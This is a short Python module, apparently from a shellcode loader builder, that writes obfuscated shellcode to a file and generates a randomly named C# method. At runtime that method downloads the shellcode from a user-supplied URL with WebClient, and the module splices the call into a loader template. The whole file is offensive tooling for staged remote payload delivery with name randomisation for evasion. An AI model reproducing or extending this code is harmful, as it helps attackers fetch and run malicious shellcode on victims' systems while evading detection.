import random
import string
from utils.utils import *

class webstring:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        print(f'Writing obfuscated shellcode to {outfile}')
        open(outfile, 'w').write(shellcode)
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self):
        return ['using System.Net;']

    def codeblock(self):
        
        return f"""

        public static String {self.name}()
        {{
            var obfuscated = (new WebClient()).DownloadString("{self.url}");
            return obfuscated;
        }}

"""

    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')
